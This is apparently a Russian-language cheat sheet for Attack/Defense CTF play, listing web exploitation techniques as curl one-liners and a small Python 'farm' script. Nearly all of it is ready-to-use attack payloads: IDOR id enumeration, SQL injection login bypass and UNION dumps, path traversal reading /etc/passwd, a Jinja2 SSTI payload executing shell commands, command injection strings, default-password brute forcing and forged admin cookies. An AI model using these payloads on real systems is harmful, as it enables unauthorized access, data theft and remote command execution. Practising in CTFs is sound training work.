# 03 — Веб-эксплойты (самое частое и самое простое)

Большинство лёгких флагов в A/D — это веб. Всё ниже — обычный `curl`, без pwntools.
Задача: вытащить флаг из хранилища сервиса (заметки, профили, сообщения, файлы).

> Флаг обычно подходит под регулярку `[A-Z0-9]{31}=`. Фильтруй вывод:
> `curl ... | grep -oE '[A-Z0-9]{31}='`

## IDOR — перебор чужих объектов (самый частый)
Сервис отдаёт объект по id без проверки прав → перебираем все id.
```bash
for i in $(seq 1 2000); do
  curl -s "http://TEAM:PORT/note/$i" | grep -oE '[A-Z0-9]{31}='
done
# другие частые пути: /api/notes/$i  /user/$i  /message/$i  /order/$i  /file?id=$i
```

## SQL-инъекция
```bash
# базовая проверка (ошибка/разное поведение = есть инъекция)
curl -s "http://TEAM:PORT/search?q=test'"

# обход авторизации
curl -s "http://TEAM:PORT/login" --data "user=admin' -- -&pass=x"

# UNION-дамп (подбери число столбцов: 1,2,3...)
curl -s "http://TEAM:PORT/search?q=x' UNION SELECT flag,2,3 FROM notes-- -" | grep -oE '[A-Z0-9]{31}='

# или sqlmap на автомате
sqlmap -u "http://TEAM:PORT/search?q=1" --batch --dump
```

## Path Traversal / LFI — чтение файлов
```bash
curl -s "http://TEAM:PORT/download?file=../../../../flag"
curl -s "http://TEAM:PORT/download?file=../../../../etc/passwd"   # проверка, что работает
# закодированный вариант, если фильтруют:
curl -s "http://TEAM:PORT/download?file=..%2f..%2f..%2fflag"
```

## SSTI — инъекция в шаблоны
```bash
# если {{7*7}} вернулось как 49 — есть SSTI (Jinja2/Flask)
curl -s "http://TEAM:PORT/?name={{7*7}}"
# чтение флага/команд:
curl -s "http://TEAM:PORT/?name={{config}}"
curl -s --data-urlencode "name={{ cycler.__init__.__globals__.os.popen('cat /flag').read() }}" "http://TEAM:PORT/"
```

## Command Injection
```bash
curl -s "http://TEAM:PORT/ping?host=127.0.0.1;cat+/flag"
curl -s "http://TEAM:PORT/ping?host=127.0.0.1|cat%20/flag"
curl -s "http://TEAM:PORT/ping" --data 'host=1`cat /flag`'
```

## Обход авторизации / слабые токены
```bash
# дефолтные креды
for p in admin password 123456 admin123 root test; do
  curl -s "http://TEAM:PORT/login" --data "user=admin&pass=$p" -i | grep -i 'set-cookie\|welcome'
done

# предсказуемый/подделываемый cookie сессии
curl -s "http://TEAM:PORT/profile" -b "session=admin"
curl -s "http://TEAM:PORT/profile" -b "user_id=1; role=admin"
```

## Сохранить сессию между запросами
```bash
curl -s -c jar.txt "http://TEAM:PORT/login" --data "user=admin' -- -&pass=x"
curl -s -b jar.txt "http://TEAM:PORT/notes" | grep -oE '[A-Z0-9]{31}='
```

## Превратить рабочий curl в эксплойт для фермы
Положи в `exploits/web_shop.py` (ферма подставит IP первым аргументом):
```python
import sys, subprocess, re
ip = sys.argv[1]
out = subprocess.run(["curl","-s",f"http://{ip}:PORT/note/1"],capture_output=True,text=True).stdout
print("\n".join(re.findall(r"[A-Z0-9]{31}=", out)))
```
